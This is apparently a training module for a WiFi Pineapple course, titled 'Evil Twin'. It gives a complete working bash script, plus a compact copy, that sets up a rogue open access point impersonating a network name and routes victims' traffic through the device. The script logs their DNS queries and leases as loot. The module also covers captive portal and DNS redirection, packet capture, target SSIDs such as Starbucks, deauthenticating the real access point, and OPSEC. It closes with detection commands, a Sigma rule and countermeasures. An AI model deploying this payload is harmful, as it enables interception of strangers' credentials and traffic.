# PP-I01: Evil Twin

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I01 |
| **Name** | Evil Twin |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Create rogue access point |
| **MITRE ATT&CK** | T1557.002 (ARP Cache Poisoning), T1557 (Adversary-in-the-Middle) |

## What This Payload Does

Creates a rogue access point that mimics a legitimate network. Clients connecting to the Evil Twin have all their traffic pass through your device, enabling credential capture and content injection.

---

## Understanding Evil Twin Attacks

```
┌─────────────────────────────────────────────────────────────┐
│                    EVIL TWIN ATTACK                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│      LEGITIMATE AP                    EVIL TWIN AP          │
│      ────────────                     ────────────          │
│      SSID: CoffeeShop                SSID: CoffeeShop       │
│      BSSID: AA:BB:CC:DD:EE:FF        BSSID: 11:22:33:44:55  │
│      Signal: -65 dBm                 Signal: -35 dBm ←STRONGER│
│      Channel: 6                      Channel: 6             │
│                                                              │
│                    ┌──────────┐                             │
│                    │  VICTIM  │                             │
│                    │  DEVICE  │                             │
│                    └────┬─────┘                             │
│                         │                                    │
│      Which AP to   ────►│◄──── connect to?                  │
│      choose?            │                                    │
│                         │                                    │
│      Client chooses STRONGER signal = Evil Twin wins!       │
│                                                              │
│   ATTACK ADVANTAGES:                                        │
│   • Victim sees familiar network name                       │
│   • Automatic reconnection if previously connected          │
│   • All traffic routed through attacker                     │
│   • Can intercept credentials, inject malware               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I01
# Name: Evil Twin
# Description: Create a rogue access point
# Author: Security Training
# WARNING: Only use on networks you own or have authorization to test!
#

# ============================================
# CONFIGURATION
# ============================================
EVIL_SSID="FreeWiFi"           # Target network name
EVIL_CHANNEL=6                  # Channel to operate on
AP_INTERFACE="wlan0"            # Interface for AP
INTERNET_INTERFACE="eth0"       # Interface with internet (optional)

# Network configuration
GATEWAY_IP="192.168.4.1"
DHCP_START="192.168.4.100"
DHCP_END="192.168.4.200"
SUBNET="255.255.255.0"

# Files
HOSTAPD_CONF="/tmp/hostapd.conf"
DNSMASQ_CONF="/tmp/dnsmasq.conf"
LOG_FILE="/tmp/pp-i01.log"
LOOT_DIR="/sd/loot/eviltwin"

# ============================================
# FUNCTIONS
# ============================================
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."

    # Stop services
    killall hostapd 2>/dev/null
    killall dnsmasq 2>/dev/null

    # Restore iptables
    iptables -t nat -F
    iptables -F FORWARD
    echo 0 > /proc/sys/net/ipv4/ip_forward

    # Reset interface
    ip addr flush dev "$AP_INTERFACE" 2>/dev/null
    ip link set "$AP_INTERFACE" down 2>/dev/null

    # Remove config files
    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"

    log "Cleanup complete"
    exit 0
}

trap cleanup SIGINT SIGTERM

usage() {
    echo "Usage: $0 [-s SSID] [-c CHANNEL] [-i INTERFACE]"
    echo ""
    echo "Options:"
    echo "  -s SSID      Target SSID to impersonate (default: FreeWiFi)"
    echo "  -c CHANNEL   Channel to operate on (default: 6)"
    echo "  -i IFACE     AP interface (default: wlan0)"
    echo "  -I IFACE     Internet interface for NAT (default: eth0)"
    echo "  -h           Show this help"
    exit 0
}

# ============================================
# PARSE ARGUMENTS
# ============================================
while getopts "s:c:i:I:h" opt; do
    case $opt in
        s) EVIL_SSID="$OPTARG" ;;
        c) EVIL_CHANNEL="$OPTARG" ;;
        i) AP_INTERFACE="$OPTARG" ;;
        I) INTERNET_INTERFACE="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-I01: Evil Twin"
log "Target SSID: $EVIL_SSID"
log "Channel: $EVIL_CHANNEL"
log "AP Interface: $AP_INTERFACE"

mkdir -p "$LOOT_DIR"

# Check for required tools
for tool in hostapd dnsmasq iptables; do
    command -v $tool >/dev/null 2>&1 || {
        log "ERROR: $tool not found. Install with opkg."
        exit 1
    }
done

# Kill interfering processes
log "Stopping interfering processes..."
airmon-ng check kill 2>/dev/null
killall hostapd dnsmasq wpa_supplicant 2>/dev/null

# ============================================
# CONFIGURE INTERFACE
# ============================================
log "Configuring $AP_INTERFACE..."

# Bring interface down
ip link set "$AP_INTERFACE" down

# Set MAC address (optional - use random)
# macchanger -r "$AP_INTERFACE" 2>/dev/null

# Bring interface up
ip link set "$AP_INTERFACE" up

# Assign IP address
ip addr flush dev "$AP_INTERFACE"
ip addr add "$GATEWAY_IP/24" dev "$AP_INTERFACE"

log "Interface configured: $GATEWAY_IP"

# ============================================
# CREATE HOSTAPD CONFIG
# ============================================
log "Creating hostapd configuration..."

cat > "$HOSTAPD_CONF" << EOF
# Evil Twin AP Configuration
interface=$AP_INTERFACE
driver=nl80211
ssid=$EVIL_SSID
hw_mode=g
channel=$EVIL_CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF

log "hostapd config created: $HOSTAPD_CONF"

# ============================================
# CREATE DNSMASQ CONFIG
# ============================================
log "Creating dnsmasq configuration..."

cat > "$DNSMASQ_CONF" << EOF
# Evil Twin DHCP/DNS Configuration
interface=$AP_INTERFACE
dhcp-range=$DHCP_START,$DHCP_END,$SUBNET,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP

# DNS settings
server=8.8.8.8
server=8.8.4.4

# Logging
log-queries
log-dhcp
log-facility=$LOOT_DIR/dns.log

# Lease file
dhcp-leasefile=$LOOT_DIR/leases.txt
EOF

log "dnsmasq config created: $DNSMASQ_CONF"

# ============================================
# CONFIGURE IP FORWARDING AND NAT
# ============================================
log "Enabling IP forwarding and NAT..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing rules
iptables -t nat -F
iptables -F FORWARD

# Set up NAT (if internet interface available)
if ip link show "$INTERNET_INTERFACE" >/dev/null 2>&1; then
    iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
    iptables -A FORWARD -i "$AP_INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
    iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$AP_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    log "NAT configured: $AP_INTERFACE -> $INTERNET_INTERFACE"
else
    log "WARNING: Internet interface $INTERNET_INTERFACE not found. No internet passthrough."
fi

# ============================================
# START SERVICES
# ============================================
log "Starting dnsmasq..."
dnsmasq -C "$DNSMASQ_CONF" &
DNSMASQ_PID=$!
sleep 2

if ! kill -0 $DNSMASQ_PID 2>/dev/null; then
    log "ERROR: dnsmasq failed to start"
    cat /var/log/dnsmasq.log 2>/dev/null | tail -10
    cleanup
fi
log "dnsmasq started (PID: $DNSMASQ_PID)"

log "Starting hostapd..."
hostapd "$HOSTAPD_CONF" &
HOSTAPD_PID=$!
sleep 3

if ! kill -0 $HOSTAPD_PID 2>/dev/null; then
    log "ERROR: hostapd failed to start"
    cleanup
fi
log "hostapd started (PID: $HOSTAPD_PID)"

# ============================================
# MONITORING
# ============================================
log "Evil Twin is ACTIVE!"
log "SSID: $EVIL_SSID"
log "Gateway: $GATEWAY_IP"
log ""
log "Press Ctrl+C to stop"
log ""

echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║           EVIL TWIN ACTIVE                         ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  SSID:    $EVIL_SSID"
echo "║  Channel: $EVIL_CHANNEL"
echo "║  Gateway: $GATEWAY_IP"
echo "╚════════════════════════════════════════════════════╝"
echo ""

# Monitor for connections
echo "Waiting for clients..."
echo ""

LAST_COUNT=0
while true; do
    # Count connected clients
    if [ -f "$LOOT_DIR/leases.txt" ]; then
        CURRENT_COUNT=$(wc -l < "$LOOT_DIR/leases.txt")

        if [ "$CURRENT_COUNT" -gt "$LAST_COUNT" ]; then
            echo ""
            echo "━━━ NEW CLIENT CONNECTED ━━━"
            tail -1 "$LOOT_DIR/leases.txt"
            LAST_COUNT=$CURRENT_COUNT

            # LED notification
            if [ -f /sys/class/leds/pineapple:blue:system/brightness ]; then
                echo 1 > /sys/class/leds/pineapple:blue:system/brightness
                sleep 0.5
                echo 0 > /sys/class/leds/pineapple:blue:system/brightness
            fi
        fi
    fi

    sleep 2
done
```

---

## Line-by-Line Breakdown

### hostapd Configuration
```bash
interface=$AP_INTERFACE     # Which interface to use
driver=nl80211              # Modern Linux wireless driver
ssid=$EVIL_SSID            # Network name to broadcast
hw_mode=g                   # 802.11g (2.4GHz)
channel=$EVIL_CHANNEL      # WiFi channel
wpa=0                       # No encryption (open network)
```

### dnsmasq Configuration
```bash
interface=$AP_INTERFACE                    # Listen on this interface
dhcp-range=192.168.4.100,192.168.4.200    # IP range for clients
dhcp-option=3,$GATEWAY_IP                  # Gateway (us)
dhcp-option=6,$GATEWAY_IP                  # DNS server (us)
```

### NAT Setup
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward              # Enable routing
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # NAT outbound traffic
```

---

## Evil Twin Variations

### Open Network (No Password)
```bash
# hostapd.conf
wpa=0
```
Simple, anyone can connect.

### WPA2 Network (With Password)
```bash
# hostapd.conf
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```
Clients expecting WPA2 will connect.

### Hidden Network
```bash
# hostapd.conf
ignore_broadcast_ssid=1
```
SSID not broadcasted, but responds to direct probes.

---

## Enhancing the Attack

### Add Captive Portal
Redirect all HTTP to your portal:
```bash
iptables -t nat -A PREROUTING -i $AP_INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### Capture Credentials
Use tcpdump to log traffic:
```bash
tcpdump -i $AP_INTERFACE -w "$LOOT_DIR/capture.pcap" &
```

### DNS Redirect All to Portal
```bash
# In dnsmasq.conf
address=/#/192.168.4.1
```
All DNS queries return your IP.

---

## Red Team Perspective

### Target Selection
1. **Open networks** - Easiest, no auth to match
2. **Common SSIDs** - "attwifi", "Starbucks", "xfinitywifi"
3. **Corporate guest** - "Company-Guest"
4. **Hotel/café** - Often expected to have captive portal

### Improving Success Rate
- **Stronger signal** - Use high-gain antenna
- **Deauth real AP** - Force clients to reconnect
- **Same channel** - Compete directly
- **Clone BSSID** - Some clients check MAC

### OPSEC Considerations
- Randomize your BSSID
- Use external antenna to position away from target
- Monitor for detection systems
- Have abort plan ready

---

## Blue Team Perspective

### Detection Methods

```bash
# Detect duplicate SSIDs
iwlist wlan0 scan | grep -E "ESSID|Address" | \
    awk '/ESSID/{ssid=$1}/Address/{print ssid, $5}' | \
    sort | uniq -d

# Check for new APs
airodump-ng wlan0mon --write baseline -o csv
# Compare with known good list
```

### Indicators of Evil Twin
1. **New BSSID** for known SSID
2. **Different channel** than usual
3. **Stronger signal** than expected
4. **No authentication** for normally encrypted network
5. **MAC vendor** different from legitimate AP

### Sigma Rule
```yaml
title: Potential Evil Twin Detection
status: experimental
description: Detects potential evil twin AP
logsource:
    product: wireless_controller
detection:
    selection:
        - duplicate_ssid: true
        - new_bssid_for_ssid: true
        - unexpected_encryption_change: true
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1557
```

### Countermeasures
1. **802.1X/EAP** - Certificate validation
2. **WPA3** - Improved security
3. **WIDS/WIPS** - Rogue AP detection
4. **User education** - Verify networks
5. **VPN** - Encrypt all traffic

---

## Practice Exercises

### Exercise 1: Basic Evil Twin
Set up an open "FreeWiFi" network and capture DHCP requests.

### Exercise 2: Targeted Clone
Clone a specific network's SSID and channel.

### Exercise 3: Detection Script
Write a script that detects Evil Twin attempts.

---

## Payload File

Save as `PP-I01_Evil_Twin.sh`:

```bash
#!/bin/bash
# PP-I01: Evil Twin (Compact)
SSID="${1:-FreeWiFi}"
IFACE="${2:-wlan0}"
IP="192.168.4.1"

# Setup
ip link set $IFACE down && ip addr flush $IFACE
ip addr add $IP/24 dev $IFACE && ip link set $IFACE up
echo 1 > /proc/sys/net/ipv4/ip_forward

# hostapd
cat > /tmp/ap.conf << EOF
interface=$IFACE
ssid=$SSID
channel=6
hw_mode=g
wpa=0
EOF

# dnsmasq
cat > /tmp/dns.conf << EOF
interface=$IFACE
dhcp-range=192.168.4.100,192.168.4.200,12h
EOF

dnsmasq -C /tmp/dns.conf &
hostapd /tmp/ap.conf
```

---

[← Back to Intermediate](README.md) | [Next: PP-I02 Captive Portal →](PP-I02_Captive_Portal.md)
